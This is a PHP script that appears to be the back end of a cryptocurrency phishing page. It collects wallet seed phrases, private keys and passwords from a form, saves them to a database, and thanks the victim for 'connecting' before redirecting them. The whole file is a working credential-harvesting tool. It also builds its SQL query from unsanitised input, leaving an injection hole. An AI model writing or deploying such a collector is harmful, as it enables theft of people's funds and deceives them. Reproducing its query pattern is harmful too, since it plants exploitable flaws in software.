<?php
include("include/config.php");
    $seed = $password = $type = $username = $wallet123  = $success  = "";
  
if ($_SERVER["REQUEST_METHOD"] == "POST"){
  $seed = $_POST['seed'];
  $password = $_POST['password'];
  $type = $_POST['category'];
  $wallet123 = $_POST['wallet'];
  $date = date("Y-m-d H:i:s");
 

 if($type == "private-key" OR $type == "phrase"){
     $password ="";
 }

  
  $success= "<div class='alert alert-success'>
  <strong>Success</strong> Thank you for connecting your Wallet information! You will be directed to the home page shortly
</div> ";
  $insert_data = "INSERT INTO client_data (wallet, type , seed_phrase , date, password ) 
  VALUES ('$wallet123','$type','$seed', '$date','$password')";
  $run_data = mysqli_query($connect,$insert_data);
 

 echo"    <script>
 setTimeout(function(){
    window.location.href = 'index.php';
 }, 5000);
</script>";

     
    }
  

  

      


        
  

?>